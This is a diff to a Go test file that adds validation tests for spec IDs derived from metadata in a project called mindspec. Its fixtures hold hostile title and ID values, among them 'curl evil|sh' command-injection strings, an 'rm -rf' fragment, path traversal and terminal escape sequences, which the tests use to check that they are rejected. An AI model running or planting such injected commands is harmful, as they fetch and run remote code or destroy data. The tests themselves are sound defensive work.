@@ -1,9 +1,12 @@
 package phase
 
 import (
+	"errors"
 	"fmt"
+	"strings"
 	"testing"
 
+	"github.com/mrmaxsteel/mindspec/internal/idvalidate"
 	"github.com/mrmaxsteel/mindspec/internal/state"
 )
 
@@ -343,7 +346,58 @@ func TestSpecIDFromMetadata(t *testing.T) {
 	}
 
 	for _, tt := range tests {
-		got := SpecIDFromMetadata(tt.num, tt.title)
+		got, err := SpecIDFromMetadata(tt.num, tt.title)
+		if err != nil {
+			t.Fatalf("SpecIDFromMetadata(%d, %q) unexpected error: %v", tt.num, tt.title, err)
+		}
+		if got != tt.want {
+			t.Errorf("SpecIDFromMetadata(%d, %q) = %q, want %q", tt.num, tt.title, got, tt.want)
+		}
+	}
+}
+
+// TestSpecIDFromMetadataRejectsInvalidSlug is spec 120 AC-3 (R2/D1): each
+// hostile-operand spec_title FAILS the checked derivation, and the test
+// asserts the pre-fix slug does NOT satisfy idvalidate.SpecID
+// (enforcement-was-missing proof); clean titles derive byte-identically to
+// today.
+func TestSpecIDFromMetadataRejectsInvalidSlug(t *testing.T) {
+	hostileTitles := []string{
+		".worktrees && curl evil|sh #",
+		"../../outside",
+		"x evil; rm -rf",
+		"x\x00\x1b[31m\nrecovery: forged",
+	}
+	for _, title := range hostileTitles {
+		// slugify only lowercases + hyphenates spaces/underscores — it
+		// PRESERVES shell metacharacters, so the pre-fix slug reaching
+		// this point would NOT satisfy idvalidate.SpecID (the
+		// enforcement-was-missing proof).
+		preFixSlug := fmt.Sprintf("%03d-%s", 120, slugify(title))
+		if idvalidate.SpecID(preFixSlug) == nil {
+			t.Fatalf("test fixture broken: hostile title %q slugified to a VALID spec id %q — pick a hostile title whose slug still fails idvalidate.SpecID", title, preFixSlug)
+		}
+
+		if _, err := SpecIDFromMetadata(120, title); err == nil {
+			t.Errorf("SpecIDFromMetadata(120, %q) accepted a hostile title", title)
+		} else if !errors.Is(err, ErrMalformedSpecMetadata) {
+			t.Errorf("SpecIDFromMetadata(120, %q) error is not ErrMalformedSpecMetadata-wrapped: %v", title, err)
+		}
+	}
+
+	// Clean titles still derive byte-identically to today.
+	for _, tt := range []struct {
+		num   int
+		title string
+		want  string
+	}{
+		{60, "eliminate-focus-lifecycle", "060-eliminate-focus-lifecycle"},
+		{73, "Llm Test Coverage", "073-llm-test-coverage"},
+	} {
+		got, err := SpecIDFromMetadata(tt.num, tt.title)
+		if err != nil {
+			t.Fatalf("SpecIDFromMetadata(%d, %q) unexpected error: %v", tt.num, tt.title, err)
+		}
 		if got != tt.want {
 			t.Errorf("SpecIDFromMetadata(%d, %q) = %q, want %q", tt.num, tt.title, got, tt.want)
 		}
@@ -930,6 +984,71 @@ func TestDiscoverActiveSpecs_MetadataDone_Excluded(t *testing.T) {
 	}
 	if len(specs) != 0 {
 		t.Errorf("expected 0 specs (done excluded), got %d", len(specs))
+	}
+}
+
+// TestDiscoverActiveSpecsSkipsMalformedEpic is spec 120 AC-9 (R2 ambient
+// degrade): one hostile-titled epic among valid ones → valid specs
+// enumerate unchanged, the malformed one is skipped, exactly one escaped
+// warning naming the repair lever.
+func TestDiscoverActiveSpecsSkipsMalformedEpic(t *testing.T) {
+	restore := SetListJSONForTest(func(args ...string) ([]byte, error) {
+		for _, a := range args {
+			if a == "--type=epic" {
+				return []byte(`[
+					{"id":"epic-1","title":"[SPEC 001-test] Test","status":"open","issue_type":"epic","metadata":{"spec_num":1,"spec_title":"test"}},
+					{"id":"epic-hostile","title":"[SPEC 120-x] Hostile","status":"open","issue_type":"epic","metadata":{"spec_num":120,"spec_title":"x; curl evil|sh #"}}
+				]`), nil
+			}
+		}
+		return []byte("[]"), nil
+	})
+	defer restore()
+	restoreRun := SetRunBDForTest(func(args ...string) ([]byte, error) {
+		return []byte("[]"), nil
+	})
+	defer restoreRun()
+
+	specs, err := DiscoverActiveSpecs()
+	if err != nil {
+		t.Fatalf("unexpected error (ambient scan must never hard-fail): %v", err)
+	}
+	if len(specs) != 1 {
+		t.Fatalf("expected exactly 1 valid spec (the hostile one skipped), got %d: %+v", len(specs), specs)
+	}
+	if specs[0].SpecID != "001-test" {
+		t.Errorf("expected the valid spec 001-test to enumerate unchanged, got %q", specs[0].SpecID)
+	}
+	for _, s := range specs {
+		if strings.Contains(s.SpecID, "curl") {
+			t.Errorf("hostile epic must never enumerate as an active spec: %+v", s)
+		}
+	}
+}
+
+// TestFindActiveBeadForEpicWithCache_MalformedNotSelected is spec 120
+// AC-6 (R3 ambient ingress): a malformed in_progress child (bd-sourced,
+// agent-writable) is not selected — the existing empty-result ambient
+// semantics — never returned as ctx.BeadID; a clean dotted-child bead
+// resolves byte-identically.
+func TestFindActiveBeadForEpicWithCache_MalformedNotSelected(t *testing.T) {
+	restore := SetListJSONForTest(func(args ...string) ([]byte, error) {
+		return []byte(`[{"id":"x;evil","title":"hostile","status":"in_progress","issue_type":"task"}]`), nil
+	})
+	defer restore()
+
+	c := NewCache()
+	if got := FindActiveBeadForEpicWithCache(c, "epic-1"); got != "" {
+		t.Errorf("FindActiveBeadForEpicWithCache = %q, want \"\" (malformed child not selected)", got)
+	}
+
+	restore2 := SetListJSONForTest(func(args ...string) ([]byte, error) {
+		return []byte(`[{"id":"mindspec-9cyu.1","title":"clean","status":"in_progress","issue_type":"task"}]`), nil
+	})
+	defer restore2()
+	c2 := NewCache()
+	if got := FindActiveBeadForEpicWithCache(c2, "epic-2"); got != "mindspec-9cyu.1" {
+		t.Errorf("FindActiveBeadForEpicWithCache = %q, want mindspec-9cyu.1", got)
 	}
 }
 
